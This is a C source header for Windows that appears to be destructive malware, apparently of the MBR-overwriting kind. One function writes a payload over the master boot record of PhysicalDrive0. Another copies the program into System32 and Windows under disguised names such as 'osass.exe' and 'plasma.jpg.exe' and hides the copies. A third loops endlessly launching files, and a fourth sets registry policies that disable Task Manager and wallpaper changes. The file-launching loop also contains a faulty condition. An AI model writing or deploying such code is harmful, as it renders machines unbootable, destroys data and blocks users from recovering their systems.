#pragma once
#include "0x00.h"
#include "Bootrec.h"

VOID 
OverwriteMBR( VOID )
{
	DWORD dwBytesWritten;

	HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	WriteFile(hDrive, MBR, 512, &dwBytesWritten, NULL);
	CloseHandle(hDrive);
}

VOID 
InfectTheSystem( VOID )
{
  // Add how many initializers it should copy; for me it will be 6
  LPCSTR lpccFileNames[6] = {
    "C:\\WINDOWS\\System32\\0x00.exe",
    "C:\\WINDOWS\\System32\\oobe\\plasma.jpg.exe",
    "C:\\WINDOWS\\osass.exe",
    "C:\\WINDOWS\\System32\\cursorconfig.exe",
    "C:\\WINDOWS\\System32\\sysres.exe",
    "C:\\WINDOWS\\645.dat"
  };
  for (INT i = 0; i < 6; i++) {
    CopyFileA(GetDir(), lpccFileNames[i], TRUE);
    SetFileAttributesA(lpccFileNames[i], FILE_ATTRIBUTE_HIDDEN);
  }
}

void ProgramOpener(void)
{
  WIN32_FIND_DATAW lpFindFileData;
  while (TRUE)
  {
    LPCWSTR lpFileName = L"\\";
    HANDLE hFindFile = FindFirstFileW(lpFileName, &lpFindFileData);
    if (lpFileName != L"logoff.exe" || L"shutdown.exe") {
      while (FindNextFileW(hFindFile, &lpFindFileData)) {
        ShellExecuteW(NULL, L"open", lpFindFileData.cFileName, NULL, NULL, SW_SHOWDEFAULT);
      }
    }
  }
}

void registrySetup ( )
{
	ManageRegW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop", L"NoChangingWallPaper", REG_DWORD, 1, NULL, FALSE, FALSE);
	ManageRegW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\SYSTEM", L"DisableTaskMGR", REG_DWORD, 1, NULL, FALSE, FALSE);
}
